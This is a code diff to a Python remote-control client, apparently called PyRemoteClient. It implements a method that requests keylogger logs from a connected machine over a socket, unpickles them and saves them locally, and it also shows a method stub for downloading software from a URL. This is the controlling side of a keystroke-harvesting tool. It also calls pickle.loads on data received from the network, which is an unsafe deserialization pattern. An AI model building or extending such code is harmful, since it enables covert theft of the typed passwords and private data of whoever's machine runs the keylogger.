@@ -2,6 +2,7 @@ import socket
 import sys
 import GUI
 import os
+import pickle
 
 HEADER = 64 
 PORT = 5000
@@ -14,6 +15,10 @@ MAINFOLDER = "PyRemoteClient/"
 
 try:
     os.mkdir(MAINFOLDER)
+except FileExistsError:
+    pass
+try:
+    os.mkdir(MAINFOLDER + "logs")
 except FileExistsError:
     pass
 
@@ -68,10 +73,17 @@ class Client:
 
     def getKeyloggerOutput(self):
         """
-        Returns a list of bytes file of all outputs
+        Returns a list containing the raw output of the keylogger
         :return:
         """
-        pass
+        self.send("getKeyloggerLogs")
+        header = int(self.conn.recv(HEADER).decode(FORMAT))
+        pickledlogs = self.conn.recv(header)
+        pickledlogs = pickle.loads(pickledlogs)
+        print(type(pickledlogs))
+        for log in pickledlogs:
+            with open(f"{MAINFOLDER}logs/{log[:12]}", "w+") as f:
+                f.write(log)
 
     def downloadSoftware(self, url: str) -> str:
         """
